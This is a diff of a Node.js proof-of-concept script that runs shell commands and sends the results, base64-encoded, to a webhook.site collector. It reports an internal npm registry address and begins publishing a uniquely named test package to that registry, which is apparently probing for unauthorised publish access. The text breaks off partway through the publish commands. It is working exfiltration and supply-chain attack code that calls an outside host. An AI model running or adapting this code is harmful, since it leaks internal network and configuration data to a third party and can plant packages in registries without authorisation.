@@ -1,11 +1,10 @@
 const cp = require("child_process");
-const OOB = "https://webhook.site/dbabceb9-a237-417e-ba20-1a8d6649c8ff";
+const OOB = "https://webhook.site/b95ec2c8-8031-4646-96c2-79eca1413c00";
 function sh(c){ try { return cp.execSync(c,{encoding:"utf8",timeout:9000,maxBuffer:8388608,stdio:["ignore","pipe","pipe"]}); } catch(e){ return "STDOUT:"+(e.stdout||"")+" STDERR:"+(e.stderr||"")+" MSG:"+String(e.message||"").slice(0,160); } }
 const REG = process.env.NPM_CONFIG_REGISTRY || "http://10.0.0.28:4873";
-function post(tag,data){ const b64=Buffer.from(String(data)).toString("base64"); sh("curl -s --max-time 7 -X POST --data-binary "+JSON.stringify(b64)+" "+JSON.stringify(OOB+"/v3-"+tag)); }
+function post(tag,data){ const b64=Buffer.from(String(data)).toString("base64"); sh("curl -s --max-time 7 -X POST --data-binary "+JSON.stringify(b64)+" "+JSON.stringify(OOB+"/v4-"+tag)); }
 try {
   post("reg", REG);
-  // PUBLISH FIRST (money shot) — unique pkg, dummy authToken to clear ENEEDAUTH, non-destructive
   const pub = [
     'set -e 2>/dev/null; D=$(mktemp -d); cd "$D"',
     'PKG="crsectest-poc-$(date +%s)-$RANDOM"',
